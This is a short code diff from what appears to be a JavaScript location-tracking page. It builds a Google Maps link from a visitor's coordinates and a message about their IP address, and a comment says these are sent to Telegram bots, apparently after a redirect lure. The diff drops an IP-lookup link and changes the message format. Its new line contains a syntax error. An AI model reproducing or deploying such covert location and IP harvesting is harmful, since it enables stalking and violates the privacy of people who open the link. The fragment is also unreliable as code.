@@ -43,13 +43,11 @@ redirectToNextURL();
    
     const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
     const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
-	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
-    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
-
+	
 // Location icon as text (Unicode character)
 const locationIcon = "\u{1F4CD}";
 
-    const htmlMessage = `${locationIcon} ${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;
+    const htmlMessage = `${locationIcon} ${message} ${locationIcon \n${clickableLink}`;
 
 
     // Send location and IP results to Telegram bots using an HTTP request
